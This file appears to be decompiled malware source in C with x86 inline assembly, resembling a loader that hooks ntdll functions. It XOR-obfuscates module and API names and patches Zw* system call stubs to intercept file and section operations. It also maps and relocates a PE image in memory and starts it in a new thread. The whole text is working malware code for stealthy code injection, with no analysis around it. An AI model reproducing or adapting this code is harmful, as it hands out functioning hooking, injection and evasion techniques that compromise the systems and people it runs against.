	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'O' ASM_EMIT 'p' ASM_EMIT 'e' ASM_EMIT 'n' ASM_EMIT 'F' ASM_EMIT 'i' ASM_EMIT 'l' ASM_EMIT 'e' ASM_EMIT '\0'

#define ASM_ZwClose \
	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'C' ASM_EMIT 'l' ASM_EMIT 'o' ASM_EMIT 's' ASM_EMIT 'e' ASM_EMIT '\0'

#define ASM_ZwQueryAttributesFile \
	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'Q' ASM_EMIT 'u' ASM_EMIT 'e' ASM_EMIT 'r' ASM_EMIT 'y' ASM_EMIT 'A' ASM_EMIT 't'  ASM_EMIT 't' ASM_EMIT 'r' ASM_EMIT 'i' ASM_EMIT 'b' ASM_EMIT 'u' ASM_EMIT 't' ASM_EMIT 'e' ASM_EMIT 's' ASM_EMIT 'F' ASM_EMIT 'i' ASM_EMIT 'l' ASM_EMIT 'e' ASM_EMIT '\0'

#define ASM_ZwQuerySection \
	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'Q' ASM_EMIT 'u' ASM_EMIT 'e' ASM_EMIT 'r' ASM_EMIT 'y' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'


void __declspec(naked) __ASM_BLOCK1_0(void)
{
	__asm
	{
		call    __ASM_BLOCK1_1
		ASM_ZwMapViewOfSection
	}
}

void __declspec(naked) __ASM_BLOCK1_1(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 4
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_2
		ASM_ZwCreateSection
	}
}

void __declspec(naked) __ASM_BLOCK1_2(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 8
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_3
		ASM_ZwOpenFile
	}
}

void __declspec(naked) __ASM_BLOCK1_3(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 8
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_4
		ASM_ZwClose
	}
}

void __declspec(naked) __ASM_BLOCK1_4(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 10h
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_5
		ASM_ZwQueryAttributesFile
	}
}

void __declspec(naked) __ASM_BLOCK1_5(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 14h
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_6
		ASM_ZwQuerySection
	}
}

void __declspec(naked) __ASM_BLOCK1_6(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 18h
		call    __ASM_REF_7
		pop     ecx
		retn
	}
}

/*************************************************************************
** ASSEMBLY BLOCK 2.                                                    **
*************************************************************************/

void __declspec(naked) __ASM_REF_3(void)
{
	__asm
	{
		pop     edx
		test    dl, dl
		jz      short __REF_0
		dec     dl
		jz      __REF_7
		dec     dl
		jz      __REF_11
		dec     dl
		jz      __REF_15
		dec     dl
		jz      __REF_21
		jmp     __REF_27

	__REF_0:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_2
		push    edx
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_1
		mov     dword ptr [esp+30h], 40h

	__REF_1:
		pop     edx

	__REF_2:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_3
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_4

	__REF_3:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_4:
		test    eax, eax
		jnz     short __REF_6
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_5
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_5
		mov     edx, [esp+16]
		push    edx
		call    __ASM_REF_4
		mov     edx, [edx+0Ch]
		call    edx

	__REF_5:
		xor     eax, eax

	__REF_6:
		retn

	__REF_7:
		cmp     dword ptr [esp+20h], 0AE1982AEh
		jnz     short __REF_8
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_8
		mov     edx, [edx+8]
		mov     eax, [esp+8]
		mov     [eax], edx
		xor     eax, eax
		retn

	__REF_8:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_9
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string

		jmp     short __REF_10

	__REF_9:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_10:
		retn

	__REF_11:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_12
		push    eax
		push    edi
		mov     edi, [esp+18h]
		call    __ASM_REF_6
		mov     edx, eax
		pop     edi
		pop     eax
		test    edx, edx
		jz      short __REF_12
		mov     eax, [esp+8]
		mov     dword ptr [eax], 0AE1982AEh
		xor     eax, eax
		retn

	__REF_12:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_13
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_14

	__REF_13:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_14:
		retn

	__REF_15:
		cmp     [esp+8], 0AE1982AEh
		jnz     short __REF_16
		xor     eax, eax
		retn

	__REF_16:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_18
		push    eax
		mov     eax, [esp+8]
		cmp     [edx+8], eax
		jnz     short __REF_17
		mov     dword ptr [edx+8], 0

	__REF_17:
		pop     eax

	__REF_18:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_19
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_20

	__REF_19:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_20:
		retn

	__REF_21:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_24
		push    eax
		push    edx
		push    edi
		mov     edi, [esp+14h]
		call    __ASM_REF_6
		pop     edi
		pop     edx
		test    eax, eax
		jz      short __REF_23
		pop     eax
		test    edx, edx
		jz      short __REF_22
		mov     edx, [esp+0Ch]
		mov     dword ptr [edx+20h], 80h

	__REF_22:
		xor     eax, eax
		retn

	__REF_23:
		pop     eax

	__REF_24:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_25
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_26

	__REF_25:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_26:
		retn

	__REF_27:
		call    __ASM_REF_4
		test    edx, edx
		push    edx
		jz      short __REF_30
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_30
		cmp     dword ptr [esp+10h], 1
		jnz     short __REF_30
		cmp     dword ptr [esp+18h], 30h
		jl      short __REF_29
		pop     edx
		push    ecx
		push    esi
		push    edi
		lea     esi, [edx+50h]
		mov     edi, [esp+1Ch]
		mov     ecx, 30h
		rep movsb
		pop     edi
		pop     esi
		pop     ecx
		mov     eax, [esp+18h]
		cmp     eax, 0
		jz      short __REF_28
		mov     dword ptr [eax], 30h

	__REF_28:
		xor     eax, eax
		retn

	__REF_29:
		pop     edx
		mov     eax, 0C000000Dh
		retn

	__REF_30:
		pop     edx
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_31
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_32

	__REF_31:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_32:
		retn
	}
}

void __declspec(naked) __ASM_REF_4(void)
{
	__asm
	{
		push    eax
		push    esi
		push    edi
		push    ecx
		push    edx
		sub     esp, 1Ch
		mov     eax, esp
		push    1Ch
		push    eax
		push    esp
		call    __ASM_REF_5
		call    dword ptr [edx+0Ch]
		mov     edi, [esp]
		add     edi, [esp+0Ch]
		add     esp, 1Ch
		pop     edx
		pop     ecx
		mov     esi, esp

	__REF_0:
		cmp     esi, edi
		jnb     short __REF_1
		lodsd
		xor     eax, 0AE1979DDh
		lea     eax, [eax+4]
		cmp     eax, esi
		jnz     short __REF_0
		lea     eax, [esi-4]
		jmp     short __REF_2

	__REF_1:
		xor     eax, eax

	__REF_2:
		mov     edx, eax
		pop     edi
		pop     esi
		pop     eax
		retn
	}
}

void __declspec(naked) __ASM_REF_5(void)
{
	__asm
	{
		call    $+5
		pop     edx
		add     edx, 124h
		retn
	}
}

void __declspec(naked) __ASM_REF_6(void)
{
	__asm
	{
		push    ebx
		push    ecx
		push    edx
		push    edi
		cmp     edi, 0
		jz      short __REF_1
		mov     edi, [edi+8]
		cmp     edi, 0
		jz      short __REF_1
		movzx   ebx, word ptr [edi]
		mov     edi, [edi+4]
		lea     ebx, [edi+ebx+2]

	__REF_0:
		lea     ebx, [ebx-2]
		cmp     ebx, edi
		jle     short __REF_1
		cmp     word ptr [ebx-2], 5Ch
		jnz     short __REF_0
		push    edx
		push    ebx
		lea     ebx, [edx+10h]
		push    ebx
		call    __ASM_REF_5
		call    dword ptr [edx+8]
		pop     edx
		test    eax, eax
		jnz     short __REF_1
		inc     eax
		jmp     short __REF_2

	__REF_1: 
		xor     eax, eax

	__REF_2:
		pop     edi
		pop     edx
		pop     ecx
		pop     ebx
		retn
	}
}

void __declspec(naked) __ASM_REF_7(void)
{
	__asm
	{
		push    eax
		push    ecx
		push    edx
		call    __ASM_REF_5
		mov     dword ptr [edx+4], 0
		push    dword ptr [edx]
		call    dword ptr [edx+14h]
		pop     ecx
		test    eax, eax
		jz      __REF_3
		push    eax
		push    ecx
		push    eax
		push    esp
		push    80h
		push    18h
		push    eax
		call    __ASM_REF_5
		call    dword ptr [edx+10h]
		pop     edx
		mov     edx, eax
		pop     ecx
		pop     eax
		test    edx, edx
		jz      __REF_3
		cmp     byte ptr [eax], 0B8h
		jnz     __REF_3
		cmp     byte ptr [eax+5], 0BAh
		jz      short __REF_1
		cmp     dword ptr [eax+5], 424548Dh
		jnz     short __REF_0
		cmp     dword ptr [eax+8], 0C22ECD04h
		jnz     short __REF_3
		sub     ecx, eax
		sub     ecx, 0Ah
		mov     [eax+6], ecx
		mov     byte ptr [eax+5], 0E8h
		mov     byte ptr [eax+0Ah], 90h
		jmp     short __REF_3

	__REF_0:
		cmp     dword ptr [eax+7], 424548Dh
		jnz     short __REF_3
		cmp     dword ptr [eax+0Bh], 0C015FF64h
		jnz     short __REF_3
		cmp     dword ptr [eax+0Fh], 0C2000000h
		jnz     short __REF_3
		push    edx
		call    __ASM_REF_5
		mov     dword ptr [edx+4], 1
		pop     edx
		push    esi
		push    eax
		push    ebx
		push    ecx
		push    edx
		mov     esi, eax
		mov     eax, [esi+0Ah]
		mov     edx, [esi+0Eh]
		sub     ecx, esi
		sub     ecx, 12h
		mov     ebx, 0E8909004h
		lock cmpxchg8b qword ptr [esi+0Ah]
		pop     edx
		pop     ecx
		pop     ebx
		pop     eax
		pop     esi
		jmp     short __REF_3

	__REF_1:
		cmp     word ptr [eax+0Ah], 0D2FFh
		jz      short __REF_2
		cmp     word ptr [eax+0Ah], 12FFh
		jnz     short __REF_3
		mov     byte ptr [eax+0Bh], 0D2h

	__REF_2:
		mov     [eax+6], ecx

	__REF_3:
		pop     eax
		retn
	}
}

A_TEXT const HMODULE NTDLL_DLL = 0;
A_TEXT const HMODULE EMPTY_PTR = 0;

A_TEXT const _tlstrcmpiW             _lstrcmpiW             = 0;
A_TEXT const _tVirtualQuery          _VirtualQuery          = 0;
A_TEXT const _tVirtualProtect        _VirtualProtect        = 0;
A_TEXT const _tGetProcAddress        _GetProcAddress        = 0;
A_TEXT const _tMapViewOfFile         _MapViewOfFile         = 0;
A_TEXT const _tUnmapViewOfFile       _UnmapViewOfFile       = 0;
A_TEXT const _tFlushInstructionCache _FlushInstructionCache = 0;
A_TEXT const _tLoadLibraryW          _LoadLibraryW          = 0;
A_TEXT const _tFreeLibrary           _FreeLibrary           = 0;
A_TEXT const _tZwCreateSection       _ZwCreateSection       = 0;
A_TEXT const _tZwMapViewOfSection    _ZwMapViewOfSection    = 0;
A_TEXT const _tCreateThread          _CreateThread          = 0;
A_TEXT const _tWaitForSingleObject   _WaitForSingleObject   = 0;
A_TEXT const _tGetExitCodeThread     _GetExitCodeThread     = 0;
A_TEXT const _tZwClose               _ZwClose               = 0;

void DecodeModuleNameA(const char *pEncodedFunctionName, char *pDecodedFunctionName)
{
	if(!pEncodedFunctionName)
	{
		*pDecodedFunctionName = 0;
		return;
	}
	
	for(; ; pDecodedFunctionName++, pEncodedFunctionName += 2)
	{
		*pDecodedFunctionName = *pEncodedFunctionName ^ 0x12;
		if(*pEncodedFunctionName == 0x12) break;
	}
}

void DecodeModuleNameW(const WCHAR *pEncodedModuleName, WCHAR *pDecodedModuleName)
{
	if(!pEncodedModuleName)
	{
		*pDecodedModuleName = 0;
		return;
	}
	
	for(; ; pEncodedModuleName++, pDecodedModuleName++)
	{
		*pDecodedModuleName = *pEncodedModuleName ^ 0xAE12;
		if(*pEncodedModuleName == 0xAE12) break;
	}
}

HMODULE GetModuleNTDLL(void)
{
	WCHAR ModuleName[100]; // [sp+0h] [bp-C8h]@1

	DecodeModuleNameW(ENCODED_NTDLL_DLL, ModuleName);
	return GetModuleHandleW(ModuleName);
}

FARPROC GetFunctionFromModule(const WCHAR *pEncodedModuleName, const char *pEncodedFunctionName)
{
	WCHAR pDecodedModuleName[100]; // [sp+0h] [bp-12Ch]@1
	CHAR ProcName[100]; // [sp+C8h] [bp-64h]@1

	DecodeModuleNameW(pEncodedModuleName, pDecodedModuleName);
	DecodeModuleNameA(pEncodedFunctionName, ProcName);
	
	return GetProcAddress(GetModuleHandleW(pDecodedModuleName), ProcName);
}

__declspec(naked) void __memcpy(void *pDestination, const void *pSource, size_t iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

FARPROC GetFunctionFromKERNEL32(const char *pEncodedFunctionName)
{
	return GetFunctionFromModule(ENCODED_KERNEL32_DLL, pEncodedFunctionName);
}

FARPROC GetFunctionFromNTDLL(const char *pEncodedFunctionName)
{
	return GetFunctionFromModule(ENCODED_NTDLL_DLL, pEncodedFunctionName);
}

signed int NTDLL_CODE_SHELLCODE_INIT(int a1)
{
	int v2; // [sp+0h] [bp-98h]@8
	int v3; // [sp+4h] [bp-94h]@5
	unsigned int v4; // [sp+8h] [bp-90h]@11
	int v5; // [sp+Ch] [bp-8Ch]@1
	int v6; // [sp+10h] [bp-88h]@1
	int v7; // [sp+14h] [bp-84h]@1
	unsigned int v8[32]; // [sp+18h] [bp-80h]@1

	v6 = *(_DWORD *)(a1 + 32);
	v7 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (char *)&__ASM_BLOCK1_0;
	
	NTDLL_CODE_SHELLCODE_FUNC4(v8, (const void *)v6, 128);
	
	v8[0] = (unsigned int)v8 ^ 0xAE1979DD;
	v8[1] = 0;
	v8[3] = *(_DWORD *)(a1 + 4);
	
	v5 = NTDLL_CODE_SHELLCODE_FUNC7(v7, (int)v8, *(const void **)(v6 + 140), *(_DWORD *)(v6 + 144));
	if(v5) return v5;
	
	v5 = NTDLL_CODE_SHELLCODE_FUNC6(a1, v7);
	if(v5)return -4;
	
	v3 = (*(int (__stdcall **)(unsigned int *))(v7 + 36))(&v8[4]);
	if(!v3) return -9;
	
	*(_DWORD *)(v6 + 128) = v3;
	if(*(_DWORD *)(v6 + 148) != -1)
	{
		v2 = (*(int (__stdcall **)(_DWORD, signed int, _DWORD, int, _DWORD, _DWORD))(v7 + 52))(
					 0,
					 524288,
					 *(_DWORD *)a1,
					 a1,
					 0,
					 0);
		if(!v2)
			return -13;
		(*(void (__stdcall **)(int, signed int))(v7 + 56))(v2, -1);
		(*(void (__stdcall **)(int, int *))(v7 + 60))(v2, &v5);
	}
	
	v4 = v8[2];
	if(v8[2])
	{
		v8[2] = 0;
		(*(void (__stdcall **)(unsigned int))(v7 + 64))(v4);
	}
	
	(*(void (__stdcall **)(int))(v7 + 28))(v6);
	return v5;
}

int __stdcall NTDLL_CODE_SHELLCODE_FUNC1(int a1)
{
	int v2; // [sp+0h] [bp-Ch]@1
	int v3; // [sp+4h] [bp-8h]@1
	unsigned int v4; // [sp+8h] [bp-4h]@1

	v3 = *(_DWORD *)(a1 + 32);
	v4 = (char *)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (char *)&__ASM_BLOCK1_0;
	v2 = (*(int (__stdcall **)(_DWORD, _DWORD))(v4 + 20))(*(_DWORD *)(v3 + 128), *(_DWORD *)(v3 + 148));
	
	if(v2)
	{
		((void (*)(_DWORD, _DWORD))v2)(*(_DWORD *)(v3 + 132), *(_DWORD *)(v3 + 136));
		return 0;
	}
	
	(*(void (__stdcall **)(_DWORD))(v4 + 40))(*(_DWORD *)(v3 + 128));
	return 0;
}

void NTDLL_CODE_SHELLCODE_FUNC2(_DWORD a1, _DWORD a2, _DWORD a3)
{
	*(_DWORD *)(a1 + 80) = *(_DWORD *)(a2 + 40) + *(_DWORD *)(a2 + 52);
	*(_DWORD *)(a1 + 84) = 0;
	*(_DWORD *)(a1 + 88) = *(_DWORD *)(a2 + 96);
	*(_DWORD *)(a1 + 92) = *(_DWORD *)(a2 + 100);
	*(_DWORD *)(a1 + 96) = *(_WORD *)(a2 + 92);
	*(_WORD *)(a1 + 100) = *(_WORD *)(a2 + 74);
	*(_WORD *)(a1 + 102) = *(_WORD *)(a2 + 72);
	*(_DWORD *)(a1 + 104) = 0;
	*(_WORD *)(a1 + 108) = *(_WORD *)(a2 + 22);
	*(_WORD *)(a1 + 110) = *(_WORD *)(a2 + 94);
	*(_WORD *)(a1 + 112) = *(_WORD *)(a2 + 4);
	*(_BYTE *)(a1 + 114) = 1;
	*(_BYTE *)(a1 + 115) = 4;
	*(_DWORD *)(a1 + 116) = *(_DWORD *)(a2 + 112);
	*(_DWORD *)(a1 + 120) = a3;
	*(_DWORD *)(a1 + 124) = 0;
}

signed int __stdcall NTDLL_CODE_SHELLCODE_FUNC3(int a1)
{
	int v2; // ST08_4@20
	int v3; // [sp+8h] [bp-24h]@12
	unsigned int v4; // [sp+Ch] [bp-20h]@12
	unsigned int j; // [sp+10h] [bp-1Ch]@14
	int v6; // [sp+18h] [bp-14h]@6
	int v7; // [sp+1Ch] [bp-10h]@6
	int v8; // [sp+24h] [bp-8h]@4
	int i; // [sp+28h] [bp-4h]@10

	if(!a1 || !*(_DWORD *)a1) return 0xC0000005;
	
	v8 = *(_DWORD *)a1;
	if(**(_WORD **)a1 != 0x5A4D) return 0xC0000005; // MZ header
	
	v6 = *(_DWORD *)(*(_DWORD *)a1 + 60) + v8;
	v7 = v8 - *(_DWORD *)(v6 + 52);
	
	if(v8 == *(_DWORD *)(v6 + 52)) return 0;
	
	*(_DWORD *)(v6 + 52) = v8;
	if(!*(_DWORD *)(v6 + 164)) return 0xC0000018;
	
	for(i = *(_DWORD *)(v6 + 160) + v8; *(_DWORD *)(i + 4); i += *(_DWORD *)(i + 4))
	{
		v4 = *(_DWORD *)(i + 4) - 8;
		v3 = i + 8;
		
		if(v4 % 2) return 0xC0000018;
		
		for(j = 0; j < v4 >> 1; ++j)
		{
			if((unsigned __int8)(*(_WORD *)v3 >> 8) >> 4)
			{
				if((unsigned __int8)(*(_WORD *)v3 >> 8) >> 4 != 3)return 0xC0000018;
				
				v2 = (*(_WORD *)v3 & 0xFFF) + *(_DWORD *)i + v8;
				*(_DWORD *)v2 += v7;
			}
			
			v3 += 2;
		}
	}
	
	return 0;
}

__declspec(naked) void NTDLL_CODE_SHELLCODE_FUNC4(void *pDestination, const void *pSource, unsigned int iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

void NTDLL_CODE_SHELLCODE_FUNC5(const void *a1, int a2, void *a3)
{
	int v4; // [sp+0h] [bp-Ch]@1
	int v5; // [sp+4h] [bp-8h]@1
	int v6; // [sp+8h] [bp-4h]@1

	v4 = *(_WORD *)(a2 + 6);
	NTDLL_CODE_SHELLCODE_FUNC4(a3, a1, *(_DWORD *)(a2 + 84));
	v5 = a2 + *(_WORD *)(a2 + 20) + 24;
	v6 = 0;
	
	while(1)
	{
		if(v6 >= v4) break;
		
		if(*(_DWORD *)(v5 + 16))
			NTDLL_CODE_SHELLCODE_FUNC4((char *)a3 + *(_DWORD *)(v5 + 12), (char *)a1 + *(_DWORD *)(v5 + 20),*(_DWORD *)(v5 + 16));
		
		++v6;
		v5 += 40;
	}
}

_DWORD NTDLL_CODE_SHELLCODE_FUNC6(_DWORD a1, _DWORD a2)
{
	int v3; // [sp+8h] [bp-Ch]@1
	void *v4; // [sp+Ch] [bp-8h]@3
	char v5; // [sp+10h] [bp-4h]@5

	v3 = *(_DWORD *)a2;
	if(!*(_DWORD *)a2) return 0;
	
	v4 = (void *)(v3 + 64);
	if(*(_DWORD *)(v3 + 64) == 0xAB49103B) return 0;
	
	if((*(int (__stdcall **)(int, signed int, signed int, char *))(a2 + 16))(v3, 4096, 128, &v5))
	{
		NTDLL_CODE_SHELLCODE_FUNC4(v4, *(const void **)(a1 + 24), *(_DWORD *)(a1 + 28));
		(*(void (__thiscall **)(void *))(a1 + 8))(v4);
		(*(void (__stdcall **)(signed int, _DWORD, _DWORD))(a2 + 32))(-1, 0, 0);
		
		return 0;
	}
	
	return -4;
}

int NTDLL_CODE_SHELLCODE_FUNC7(int a1, int a2, const void *a3, int a4)
{
	int v5; // [sp+0h] [bp-1Ch]@3
	int v6; // [sp+4h] [bp-18h]@5
	int v7; // [sp+8h] [bp-14h]@5
	int v8; // [sp+Ch] [bp-10h]@5
	int v9; // [sp+10h] [bp-Ch]@7
	int v10; // [sp+14h] [bp-8h]@5
	const void *v11; // [sp+18h] [bp-4h]@1

	*(_DWORD *)(a2 + 8) = 0;
	v11 = a3;
	
	if(*(_WORD *)a3 != MZ_HEADER) return -2;
	
	v5 = (int)((char *)a3 + *((_DWORD *)v11 + 15));
	if(*(_DWORD *)v5 != PE_HEADER) return -2;
	
	v6 = *(_DWORD *)(v5 + 80);
	v7 = 0;
	
	v8 = (*(int (__stdcall **)(int *, signed int, _DWORD, int *, signed int, signed int, _DWORD))(a1 + 44))(&v10, 983071, 0, &v6, 64, 134217728, 0);
	if(v8) return -11;
	
	v9 = (*(int (__stdcall **)(int, signed int, _DWORD, _DWORD, _DWORD))(a1 + 24))(v10, 6, 0, 0, 0);
	if(!v9)
	{
			(*(void (__stdcall **)(int))(a1 + 64))(v10);
		return -10;
	}
	
	*(_DWORD *)(a2 + 8) = v10;
	NTDLL_CODE_SHELLCODE_FUNC5(a3, v5, (void *)v9);
	NTDLL_CODE_SHELLCODE_FUNC2(a2, v5, a4);
	(*(void (__stdcall **)(int))(a1 + 28))(v9);
	
	return 0;
}

void NTDLL_CODE_SHELLCODE_END(void)
{
	;
}
